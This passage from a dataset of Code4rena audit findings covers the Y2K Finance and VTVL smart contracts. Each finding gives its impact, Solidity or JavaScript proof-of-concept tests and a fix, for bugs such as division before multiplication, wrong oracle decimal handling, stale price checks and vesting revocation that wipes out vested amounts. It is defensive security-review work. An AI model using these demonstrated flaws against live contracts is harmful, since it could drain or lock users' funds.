nothing to the receiver and treasury.  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L378-L426 ```solidity     function beforeWithdraw(uint256 id, uint256 amount)         public         view         returns (uint256 entitledAmount)     {         // in case the risk wins aka no depeg event         // risk users can withdraw the hedge (that is paid by the hedge buyers) and risk; withdraw = (risk + hedge)         // hedge pay for each hedge seller = ( risk / tvl before the hedge payouts ) * tvl in hedge pool         // in case there is a depeg event, the risk users can only withdraw the hedge         if (             keccak256(abi.encodePacked(symbol)) ==             keccak256(abi.encodePacked(\"rY2K\"))         ) {             if (!idDepegged[id]) {                 //depeg event did not happen                 /*                 entitledAmount =                     (amount / idFinalTVL[id]) *                     idClaimTVL[id] +                     amount;                 */                 entitledAmount =                     amount.divWadDown(idFinalTVL[id]).mulDivDown(                         idClaimTVL[id],                         1 ether                     ) +                     amount;             } else {                 //depeg event did happen                 entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(                     idClaimTVL[id],                     1 ether                 );             }         }         // in case the hedge wins aka depegging         // hedge users pay the hedge to risk users anyway,         // hedge guy can withdraw risk (that is transfered from the risk pool),         // withdraw = % tvl that hedge buyer owns         // otherwise hedge users cannot withdraw any Eth         else {             entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(                 idClaimTVL[id],                 1 ether             );         }          return entitledAmount;     } ```  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L203-L234 ```solidity     function withdraw(         uint256 id,         uint256 assets,         address receiver,         address owner     )         external         override         epochHasEnded(id)         marketExists(id)         returns (uint256 shares)     {         if(             msg.sender != owner &&             isApprovedForAll(owner, receiver) == false)             revert OwnerDidNotAuthorize(msg.sender, owner);          shares = previewWithdraw(id, assets); // No need to check for rounding error, previewWithdraw rounds up.          uint256 entitledShares = beforeWithdraw(id, shares);         _burn(owner, id, shares);          //Taking fee from the amount         uint256 feeValue = calculateWithdrawalFeeValue(entitledShares, id);         entitledShares = entitledShares - feeValue;         asset.transfer(treasury, feeValue);          emit Withdraw(msg.sender, receiver, owner, id, assets, entitledShares);         asset.transfer(receiver, entitledShares);          return entitledShares;     } ```  ## Proof of Concept Please append the following test in `test\\AssertTest.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     function testReceiveZeroDueToDivBeingPerformedBeforeMul() public {         vm.deal(alice, 1e24);         vm.deal(chad, 1e24);          vm.startPrank(admin);         FakeOracle fakeOracle = new FakeOracle(oracleFRAX, STRIKE_PRICE_FAKE_ORACLE);         vaultFactory.createNewMarket(FEE, tokenFRAX, DEPEG_AAA, beginEpoch, endEpoch, address(fakeOracle), \"y2kFRAX_99*\");         vm.stopPrank();          address hedge = vaultFactory.getVaults(1)[0];         address risk = vaultFactory.getVaults(1)[1];                  Vault vHedge = Vault(hedge);         Vault vRisk = Vault(risk);          // alice deposits 1e24 in hedge vault         vm.startPrank(alice);         ERC20(WETH).approve(hedge, 1e24);         vHedge.depositETH{value: 1e24}(endEpoch, alice);         vm.stopPrank();          // chad deposits 1e24 in risk vault         vm.startPrank(chad);         ERC20(WETH).approve(risk, 1e24);         vRisk.depositETH{value: 1e24}(endEpoch, chad);         vm.stopPrank();          vm.warp(beginEpoch + 10 days);          // depeg occurs         controller.triggerDepeg(SINGLE_MARKET_INDEX, endEpoch);          vm.startPrank(chad);          // chad withdraws 1e5 from risk vault         vRisk.withdraw(endEpoch, 1e5, chad, chad);          // the amount to chad is 0 because division is performed before multiplication         uint256 entitledShares = vRisk.beforeWithdraw(endEpoch, 1e5);          // chad receives nothing         assertEq(entitledShares, 0);         assertEq(ERC20(WETH).balanceOf(chad), 0);          // the amount to chad would be positive when multiplication is performed before division         uint256 entitledShares2 = (1e5 * vRisk.idClaimTVL(endEpoch)) / vRisk.idFinalTVL(endEpoch);         assertTrue(entitledShares2 > entitledShares);          vm.stopPrank();     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps `entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(idClaimTVL[id], 1 ether)` in the `beforeWithdraw` function can be updated to the following code. ```solidity     entitledAmount = (amount * idClaimTVL[id]) / idFinalTVL[id] ```"}, {"title": "`tvl` used in the emitted `DepegInsurance` `event` is created incorrectly when calling `triggerEndEpoch`", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/336", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L198-L248 https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L59-L64   # Vulnerability details  ## Impact When calling the following `triggerEndEpoch` function, `tvl`, which is a `VaultTVL` type, is created as a part of the emitted `DepegInsurance` `event` after `idClaimTVL` and `idFinalTVL` are already updated for both the hedge and risk vaults. However, comparing to the fields of the `VaultTVL` `struct` definition below, `insrVault.idClaimTVL(epochEnd)` is incorrectly used as `RISK_finalTVL` and `riskVault.idFinalTVL(epochEnd)` is incorrectly used as `INSR_claimTVL` because `insrVault.setClaimTVL(epochEnd, 0)` has been executed, which does not occur when calling the `triggerDepeg` function. Because of the incorrect `tvl` used in the emitted `DepegInsurance` `event`, the frontend can display misleading information that confuse users, and debugging with incorrect data will be hard for developers.  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L198-L248 ```solidity     function triggerEndEpoch(uint256 marketIndex, uint256 epochEnd) public {         if(             vaultFactory.getVaults(marketIndex).length != VAULTS_LENGTH)                 revert MarketDoesNotExist(marketIndex);         if(             block.timestamp < epochEnd)             revert EpochNotExpired();          address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);          Vault insrVault = Vault(vaultsAddress[0]);         Vault riskVault = Vault(vaultsAddress[1]);          if(insrVault.idExists(epochEnd) == false || riskVault.idExists(epochEnd) == false)             revert EpochNotExist();          //require this function cannot be called twice in the same epoch for the same vault         if(insrVault.idFinalTVL(epochEnd) != 0)             revert NotZeroTVL();         if(riskVault.idFinalTVL(epochEnd) != 0)              revert NotZeroTVL();          insrVault.endEpoch(epochEnd, false);         riskVault.endEpoch(epochEnd, false);          insrVault.setClaimTVL(epochEnd, 0);         riskVault.setClaimTVL(epochEnd, insrVault.idFinalTVL(epochEnd));         insrVault.sendTokens(epochEnd, address(riskVault));          VaultTVL memory tvl = VaultTVL(             riskVault.idClaimTVL(epochEnd),             insrVault.idClaimTVL(epochEnd),             riskVault.idFinalTVL(epochEnd),             insrVault.idFinalTVL(epochEnd)         );          emit DepegInsurance(             keccak256(                 abi.encodePacked(                     marketIndex,                     insrVault.idEpochBegin(epochEnd),                     epochEnd                 )             ),             tvl,             false,             epochEnd,             block.timestamp,             getLatestPrice(insrVault.tokenInsured())         );     } ```  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L59-L64 ```solidity     struct VaultTVL {         uint256 RISK_claimTVL;         uint256 RISK_finalTVL;         uint256 INSR_claimTVL;         uint256 INSR_finalTVL;     } ```  ## Proof of Concept Please append the following test in `test\\AssertTest.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     function testCallingtriggerEndEpochCreatesIncorrectVaultTVL() public{         testDeposit();          address hedge = vaultFactory.getVaults(1)[0];         address risk = vaultFactory.getVaults(1)[1];          Vault vHedge = Vault(hedge);         Vault vRisk = Vault(risk);          vm.warp(endEpoch + 1 days);          controller.triggerEndEpoch(SINGLE_MARKET_INDEX, endEpoch);          /* VaultTVL struct has the following structure              struct VaultTVL {                 uint256 RISK_claimTVL;                 uint256 RISK_finalTVL;                 uint256 INSR_claimTVL;                 uint256 INSR_finalTVL;             }          */          /* in controller.triggerEndEpoch, VaultTVL is created as follows after idClaimTVL and idFinalTVL for both vaults are already updated              VaultTVL memory tvl = VaultTVL(                 riskVault.idClaimTVL(epochEnd),                 insrVault.idClaimTVL(epochEnd),                 riskVault.idFinalTVL(epochEnd),                 insrVault.idFinalTVL(epochEnd)             );          */          // insrVault.idClaimTVL(epochEnd), which is vHedge.idClaimTVL(endEpoch), does not correspond to RISK_finalTVL, which should be vRisk.idFinalTVL(endEpoch)         assertTrue(vRisk.idFinalTVL(endEpoch) != vHedge.idClaimTVL(endEpoch));          // riskVault.idFinalTVL(epochEnd), which is vRisk.idFinalTVL(endEpoch), does not correspond to INSR_claimTVL, which should be vHedge.idClaimTVL(endEpoch)          assertTrue(vHedge.idClaimTVL(endEpoch) != vRisk.idFinalTVL(endEpoch));     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L227-L232 can be updated to the following code. ```solidity         VaultTVL memory tvl = VaultTVL(             riskVault.idClaimTVL(epochEnd),             riskVault.idFinalTVL(epochEnd),             insrVault.idClaimTVL(epochEnd),             insrVault.idFinalTVL(epochEnd)         ); ```"}, {"title": "End epoch cannot be triggered preventing winners to withdraw", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/278", "labels": ["bug", "3 (High Risk)", "high quality report", "sponsor confirmed", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198 https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L246 https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261 https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L277-L286 https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203   # Vulnerability details  ## Impact At the end of an epoch, the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) is called to trigger 'epoch end without depeg event', making risk users the winners and entitling them to [withdraw](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203) (risk + hedge) from the vault. In the case of the Arbitrum sequencer going down or restarting, there is a [grace period of one hour](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L285) before the [getLatestPrice()](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261) returns to execute without reverting. This means that the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) cannot complete during this time, because it calls the [getLatestPrice()](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261).  Making this high-priority because unless the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) completes: - winners cannot [withdraw](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203) althought the epoch is over; - during this time the strike price might be reached causing a depeg event at all effects turning the table for the winners; - the [getLatestPrice()](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261) is not functional to the completion of the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198), nor to the [withdraw](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203), but only informative used to initialize the event object emitted [at the very end of the triggerEndEpoch function](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L246).  First two points each constitute independent jsutification, thrid point reinforces the first 2 points.   ## Proof of Concept  ### triggerEndEpoch reverts if arbiter down or restarted less than eq GRACE_PERIOD_TIME ago (1hr)  File: [Controller.sol:L246](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L246)  Revert if getLatestPrice reverts.  ```solidity function triggerEndEpoch(uint256 marketIndex, uint256 epochEnd) public {          < ... omitted ... >      emit DepegInsurance(         keccak256(             abi.encodePacked(                 marketIndex,                 insrVault.idEpochBegin(epochEnd),                 epochEnd             )         ),         tvl,         false,         epochEnd,         block.timestamp,         getLatestPrice(insrVault.tokenInsured()) // @audit getLatestPrice reverts while sequencer unavailable or during grace period     ); } ```  File: [Controller.sol:L277-L286](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L277-L286)  Revert if sequencer down or grace period after restart not over.  ```solidity function getLatestPrice(address _token)     public     view     returns (int256 nowPrice) {     < ... omitted ... >      bool isSequencerUp = answer == 0;     if (!isSequencerUp) {         revert SequencerDown();     }      // Make sure the grace period has passed after the sequencer is back up.     uint256 timeSinceUp = block.timestamp - startedAt;     if (timeSinceUp <= GRACE_PERIOD_TIME) { // @audit 1 hour         revert GracePeriodNotOver();     }      < ... omitted ... > } ```  ### withdraw fails if triggerEndEpoch did not execute successfully  File: [Vault.sol:L203](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203)  Can execute if block.timestamp > epochEnd, but fails if trigger did not execute. Winners cannot withdraw.  ```solidity function withdraw(     uint256 id,     uint256 assets,     address receiver,     address owner )     external     override     epochHasEnded(id) // @audit same as require((block.timestamp > id) || idDepegged[id]), hence independent from triggers.     marketExists(id)     returns (uint256 shares) {     < ... omitted ... >      uint256 entitledShares = beforeWithdraw(id, shares); // @audit ratio is idClaimTVL[id]/ifFinalTVL[id], hence zero unless triggers executed          < ... omitted ... >      emit Withdraw(msg.sender, receiver, owner, id, assets, entitledShares);     asset.transfer(receiver, entitledShares);      return entitledShares; } ```  ## Tools Used n/a  ## Recommended Mitigation Steps  The latest price is retrieved at the very end of the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) for the only purpose of initializing the DepegInsurance event.  Since it is used for informational purpose (logging / offchain logging) and not for functional purpose to the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) execution, it can be relaxed.   Depending on how the event is used, when getLatestPrice() is called for informative/logging purpose only, there could be few alternatives: - log a 0 when SequencerDown or GRACE_PERIOD_TIME not passed - log a 0 when SequencerDown and ignore GRACE_PERIOD_TIME  Once events are logged off-chain, some post processing may be used to correct/update the values with accurate data."}, {"title": "Immutable address owner is risky", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/274", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code   https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/VaultFactory.sol#L157 https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/VaultFactory.sol#L163-L374   # Vulnerability details  # Immutable address owner is risky in `VaultFactory.sol` ### Impact The following contracts and functions, allow admins to interact with core functions such as:  `VaultFactory.sol` functions for:   - createNewMarket   - deployMoreAssets   - setController   - changeTreasury   - changeTimewindow   - changeController   - changeOracle  Given that `admin` is immutable it's very risky because it is irrecoverable from any mistakes  Scenario: If an incorrect address, e.g. for which the private key is not known, is used accidentally then it prevents the use of all the `onlyAdmin()` functions forever, which includes the changing of various critical addresses and parameters. This use of incorrect address may not even be immediately apparent given that these functions are probably not used immediately.   When noticed, due to a failing `onlyAdmin()` function call, it will force the redeployment of these contracts and require appropriate changes and notifications for switching from the old to new address. This will diminish trust in the protocol and incur a significant reputational damage.  ### Github Permalinks https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/VaultFactory.sol#L157  - Admin functions affected https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/VaultFactory.sol#L163-L374  ### Recommended steps Recommend remove immutable from admin address. Also taking care while deploying the contract / emitting an event when assigning _admin so in case it is wrongly deployed, it can be redeployed earlier. Finally adding a 2 steps transfer from admin for cases when admin needs to be migrate to another address.    "}, {"title": "Incorrect handling of pricefeed.decimals()", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/195", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed", "edited-by-warden", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L46-L83 https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L299-L300   # Vulnerability details  ## Impact Wrong maths for handling pricefeed decimals. This code will only work for pricefeeds of 8 decimals, any others give wrong/incorrect data. The maths used can be shown in three lines:  ```solidity nowPrice = (price1 * 10000) / price2; nowPrice = nowPrice * int256(10**(18 - priceFeed1.decimals())); return nowPrice / 1000000; ```  Line1: adds 4 decimals Line2: adds (18 - d) decimals, (where d = pricefeed.decimals()) Line3:  removes 6 decimals  Total: adds (16 - d) decimals  when d=8, the contract correctly returns an 8 decimal number. However, when d = 6, the function will return a 10 decimal number. This is further raised by (18-d = 12) decimals when checking for depeg event, leading to a 22 decimal number which is 4 orders of magnitude incorrect.  if d=18, (like usd-eth pricefeeds) contract fails / returns 0.  All chainlink contracts which give price in eth, operate with 18 decimals. So this can cripple the system if added later.  ## Proof of Concept Running the test  AssertTest.t.sol:testPegOracleMarketCreation and changing the line on  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/test/AssertTest.t.sol#L30  to ```solidity PegOracle pegOracle3 = new PegOracle(             0xB1552C5e96B312d0Bf8b554186F846C40614a540,  //usd-eth contract address             btcEthOracle         ); ``` gives this output  ``` oracle3price1: 1085903802394919427                                                                                                                                                                                oracle3price2: 13753840915281064000                                                                                                                                                                               oracle3price1 / oracle3price2: 0 ```  returning an oracle value of 0. Simulating with a mock price feed of 6 decimals gives results 4 orders of magnitude off.  ## Tools Used Foundry, vs-code  ## Recommended Mitigation Steps Since only the price ratio is calculated, there is no point in increasing the decimal by (18-d) in the second line. Proposed solution: ```solidity nowPrice = (price1 * 10000) / price2; nowPrice = nowPrice * int256(10**(priceFeed1.decimals())) * 100; return nowPrice / 1000000; ``` This returns results in d decimals, no matter the value of d. "}, {"title": "Depeg event can happen at incorrect price", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/69", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L96   # Vulnerability details  ## Impact Depeg event can still happen when the price of a pegged asset is equal to the strike price of a Vault which is incorrect.   This docs clearly mentions:  \"When the price of a pegged asset is below the strike price of a Vault, a Keeper(could be anyone) will trigger the depeg event and both Vaults(hedge and risk) will swap their total assets with the other party.\" - https://code4rena.com/contests/2022-09-y2k-finance-contest  ## Proof of Concept  1. Assume strike price of vault is 1 and current price of pegged asset is also 1  2. User calls [triggerDepeg](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L148) function which calls isDisaster modifier to check the depeg eligibility  3. Now lets see [isDisaster](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L83) modifier  ``` modifier isDisaster(uint256 marketIndex, uint256 epochEnd) {         address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);         if(             vaultsAddress.length != VAULTS_LENGTH             )             revert MarketDoesNotExist(marketIndex);          address vaultAddress = vaultsAddress[0];         Vault vault = Vault(vaultAddress);          if(vault.idExists(epochEnd) == false)             revert EpochNotExist();          if(             vault.strikePrice() < getLatestPrice(vault.tokenInsured())             )             revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));          if(             vault.idEpochBegin(epochEnd) > block.timestamp)             revert EpochNotStarted();          if(             block.timestamp > epochEnd             )             revert EpochExpired();         _;     } ```  4. Assume block.timestamp is at correct timestamp (between idEpochBegin and epochEnd), so none of revert execute. Lets look into the interesting one at  ```         if(             vault.strikePrice() < getLatestPrice(vault.tokenInsured())             )             revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured())); ```  5. Since in our case price of vault=price of pegged asset so if condition does not execute and finally isDisaster completes without any revert meaning go ahead of depeg  6. But this is incorrect since price is still not below strike price and is just equal  ## Recommended Mitigation Steps Change the isDisaster modifier to revert when price of a pegged asset is equal to the strike price of a Vault  ``` if(             vault.strikePrice() <= getLatestPrice(vault.tokenInsured())             )             revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured())); ```"}, {"title": "Different Oracle issues can return outdated prices", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/oracles/PegOracle.sol#L63 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/Controller.sol#L308 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/oracles/PegOracle.sol#L126   # Vulnerability details  ## Impact Different problems have been found with the use of the oracle that can incur economic losses when the oracle is not consumed in a completely safe way.  ## Proof of Concept  Thre problems found are:  - The `timeStamp` check is not correct since in both cases it is done against 0, which would mean that a date of 2 years ago would be valid, so old prices can be taken.  ```javascript     function getLatestPrice(address _token)         public         view         returns (int256 nowPrice)     {         ...         if(timeStamp == 0)             revert TimestampZero();         return price;     } ```  - Oracle price 1 can be outdated:  The `latestRoundData` method of the `PegOracle` contract calls `priceFeed1.latestRoundData();` directly, but does not perform the necessary round or timestamp checks, and delegates them to the caller, but these checks are performed on price2 because it calls `getOracle2_Price` in this case, this inconsistency between how it take the price1 and price2 behaves favors human errors when consuming the oracle.  ## Recommended Mitigation Steps  For the timestamp issue, it should be checked like this:  ```diff +   uint constant observationFrequency = 1 hours;      function getLatestPrice(address _token)         public         view         returns (int256 nowPrice)     {         ...         (             uint80 roundID,             int256 price,             ,             uint256 timeStamp,             uint80 answeredInRound         ) = priceFeed.latestRoundData();          uint256 decimals = 10**(18-(priceFeed.decimals()));         price = price * int256(decimals);          if(price <= 0)             revert OraclePriceZero();          if(answeredInRound < roundID)             revert RoundIDOutdated();  -       if(timeStamp == 0) +       if(timeStamp < block.timestamp - uint256(observationFrequency))             revert TimestampZero();          return price;     } ```   "}, {"title": "Vault.sol is not EIP-4626 compliant ", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/47", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/Vault.sol#L244-L252 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L205-L213 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L237-L239 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L244-L246 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L251-L258 https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L263-L270   # Vulnerability details  ## Impact  Other protocols that integrate with Y2K may wrongly assume that the functions are EIP-4626 compliant. Thus, it might cause integration problems in the future that can lead to wide range of issues for both parties.   ## Proof of Concept  All official EIP-4626 requirements can be found on it's [official page](https://eips.ethereum.org/EIPS/eip-4626#methods). Non-compliant functions are listed below along with the reason they are not compliant:  The following functions are missing but should be present: 1. mint(uint256, address) returns (uint256) 2. redeem(uint256, address, address) returns (uint256)  The following functions are non-compliant because they don't account for withdraw and deposit locking: 1. maxDeposit 2. maxMint 3. maxWithdraw 4. maxRedeem  All of the above functions should return 0 when their respective functions are disabled (i.e. maxDeposit should return 0 when deposits are disabled)  previewDeposit is not compliant because it must account for fees which it does not  totalAssets is not compliant because it does not always return the underlying managed by the vault because it fails to include the assets paid out during a depeg or the end of the epoch.  ## Tools Used  ## Recommended Mitigation Steps  All functions listed above should be modified to meet the specifications of EIP-4626"}, {"title": "Loss of vested amounts", "html_url": "https://github.com/code-423n4/2022-09-vtvl-findings/issues/475", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-vtvl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L418 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L147-L151 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L364   # Vulnerability details  ## Impact  Vesting is a legal term that means the point in time where property is earned or gained by some person. The VTVLVesting contract defines: - a start time (Claim::startTimestamp) and an end time (Claim::endTimestamp) at which vesting starts and ends for a entitled user - the calculated points in time when the fractions of the total amount are released and therefore can be withdrawn (which are defined by Claim::releaseIntervalSecs). The entitled user can either withdraw after each interval elapses, or after the whole vesting period is over or any variant of the two options.  The administrator of the contract can revoke the claim for a user at any time, which for vesting assets is expected. For example an employee with a vesting stock allocation of 1000 shares vesting at each quarter over a period of 4 years, may resign after 2 years and therefore the only half of the shares would be vested and therefore sold by the employee. The employee can either sell them at each quarter, or before, or after resigning, in any case the half of the shares have vested and are by legal right owned by the employee.  The VTVLContract revoke has the following defects: - it ignores the amount already vested and now yet withdrawn - if called, say half-way the total period, just after claimer withdraws the already vested amount, it revokes only the right to vest the remaining part in future. - if called, say half-way the total period, right before the claimer withdraws the already vested amount, it revokes both the already vested amount and the right to vest the remaining part in future.  Raising as high impact because it actually causes: - loss of already vested amounts of a user with a valid claim that has already righteously vested a part but not withdrawn - different outcomes depending on the order in which withdraw and revokeClaim functions are called which means that one of the two behavoiurs is certainly in conflict with the other causing a loss on one of the two sides, contract or claimer (by definition of Vesting rights, the claimer). - lack of trust by the potential claimers/users whch can be at any time deprived of righteously vested amounts.  ## Proof of Concept  The following two tests prove the behaviour difference when the order by which revokeClaim vs withdraw are called, whch shows that the vesting right is not guaranteed.  ```solidity   // NOTE: USES ORIGINAL REVOKE BEHAVIOUR   it('sample revoke use case USER LOSE: employee withdraw immediately after resignation', async () => {     const {tokenContract, vestingContract} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens});      const startTimestamp = await getLastBlockTs() + 100;     const endTimestamp = startTimestamp + 2000;     const terminationTimestamp = startTimestamp + 1000 + 50; // half-way vesting, plus half release interval which shall be discarded     const releaseIntervalSecs = 100;      await vestingContract.createClaim(owner2.address, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount);      // move clock to termination timestamp (half-way the vesting period plus a bit, but less than release interval seconds)     await ethers.provider.send(\"evm_mine\", [terminationTimestamp]);          let availableAmt = await vestingContract.claimableAmount(owner2.address)     // revoke the claim preserving the \"already vested but not yet withdrawn amount\"     await (await vestingContract.revokeClaim(owner2.address)).wait();          let userBalanceBefore = await tokenContract.balanceOf(owner2.address);     await expect(vestingContract.connect(owner2).withdraw()).to.be.revertedWith('NO_ACTIVE_CLAIM');     let userBalanceAfter = await tokenContract.balanceOf(owner2.address);      // move the clock to the programmed end of vesting period     await ethers.provider.send(\"evm_mine\", [endTimestamp]);      // cliffTimestamp < startTimestamp < terminationTimestamp, hence expected cliffAmount + (1/2 * anlinearVestAmount)     let expectedVestedAmount = cliffAmount.add(linearVestAmount.div(2));      // RESIGNING EMPLOYEE LOSES HIS VESTED AMOUNT BECAUSE OF WITHDRAWING IMMEDIATELY AFTER RESIGNATION     expect(userBalanceAfter.sub(userBalanceBefore)).to.be.equal(0);     // VTVLVesting CONTRACT TOOK ALREADY VESTED AMOUNT FROM OWNER2     expect(await vestingContract.finalClaimableAmount(owner2.address)).to.be.equal(0);   });    // NOTE: USES ORIGINAL REVOKE BEHAVIOUR   it('sample revoke use case USER WIN: employee withdraw immediately before resignation', async () => {     const {tokenContract, vestingContract} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens});      const startTimestamp = await getLastBlockTs() + 100;     const endTimestamp = startTimestamp + 2000;     const terminationTimestamp = startTimestamp + 1000 + 50; // half-way vesting, plus half release interval which shall be discarded     const releaseIntervalSecs = 100;      await vestingContract.createClaim(owner2.address, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount);      // move clock to termination timestamp (half-way the vesting period plus a bit, but less than release interval seconds)     await ethers.provider.send(\"evm_mine\", 